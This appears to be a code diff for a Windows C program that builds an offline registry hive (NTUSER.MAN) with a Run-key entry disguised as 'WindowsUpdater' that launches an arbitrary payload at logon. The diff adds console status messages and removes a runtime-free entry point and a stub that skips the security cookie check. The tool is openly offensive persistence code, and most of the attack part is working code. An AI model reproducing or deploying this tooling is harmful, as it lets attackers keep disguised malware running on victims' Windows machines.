@@ -1,17 +1,5 @@
 #include <windows.h>
-
-// --- 修复链接错误：手动实现底层运行库 ---
-extern "C" int _fltused = 0;
-#pragma function(memset)
-extern "C" void* __cdecl memset(void* dest, int c, size_t count) {
-    char* bytes = (char*)dest;
-    while (count--) *bytes++ = (char)c;
-    return dest;
-}
-extern "C" void __cdecl __security_check_cookie(unsigned __intptr_t cookie) {
-    // 空实现，绕过安全 Cookie 检查
-}
-// ------------------------------------------
+#include <stdio.h>
 
 typedef PVOID ORHKEY;
 typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
@@ -64,9 +52,11 @@ void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
     *pMajor = 6; *pMinor = 1;
 }
 
-// 核心逻辑，接收命令行参数
-int RealMain(int argc, char* argv[]) {
-    if (argc != 3) return 1;
+int main(int argc, char* argv[]) {
+    if (argc != 3) {
+        printf("Usage: %s <payload_path> <output_ntuser_man>\n", argv[0]);
+        return 1;
+    }
 
     WCHAR payloadPath[MAX_PATH] = {0};
     WCHAR outputPath[MAX_PATH] = {0};
@@ -74,13 +64,20 @@ int RealMain(int argc, char* argv[]) {
     MultiByteToWideChar(CP_ACP, 0, argv[2], -1, outputPath, MAX_PATH);
 
     OffregApi api = { 0 };
-    if (!InitOffreg(&api)) return 1;
+    if (!InitOffreg(&api)) {
+        printf("[-] Failed to load offreg.dll.\n");
+        return 1;
+    }
 
     DWORD osMajor, osMinor;
     GetRealOsVersion(&osMajor, &osMinor);
+    printf("[*] Detected OS version: %lu.%lu\n", osMajor, osMinor);
 
     ORHKEY hHive = NULL;
-    if (api.CreateHive(&hHive) != ERROR_SUCCESS) return 1;
+    if (api.CreateHive(&hHive) != ERROR_SUCCESS) {
+        printf("[-] ORCreateHive failed.\n");
+        return 1;
+    }
 
     LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
     LPCWSTR valueName  = L"WindowsUpdater";
@@ -103,31 +100,6 @@ int RealMain(int argc, char* argv[]) {
     api.SaveHive(hHive, outputPath, osMajor, osMinor);
     api.CloseHive(hHive);
 
+    printf("[+] Successfully generated VALID NTUSER.MAN at: %s\n", argv[2]);
     return 0;
-}
-
-// --- 修改入口点为 Win32 的 wWinMainCRTStartup，彻底抛弃 C 运行库 ---
-extern "C" void __stdcall wWinMainCRTStartup() {
-    int argc = 0;
-    LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
-    
-    char** argvA = NULL;
-    if (argvW && argc > 0) {
-        argvA = (char**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(char*) * argc);
-        for (int i = 0; i < argc; i++) {
-            int len = WideCharToMultiByte(CP_ACP, 0, argvW[i], -1, NULL, 0, NULL, NULL);
-            argvA[i] = (char*)HeapAlloc(GetProcessHeap(), 0, len);
-            WideCharToMultiByte(CP_ACP, 0, argvW[i], -1, argvA[i], len, NULL, NULL);
-        }
-    }
-
-    int ret = RealMain(argc, argvA);
-
-    if (argvA) {
-        for (int i = 0; i < argc; i++) HeapFree(GetProcessHeap(), 0, argvA[i]);
-        HeapFree(GetProcessHeap(), 0, argvA);
-    }
-    if (argvW) LocalFree(argvW);
-
-    ExitProcess(ret);
 }
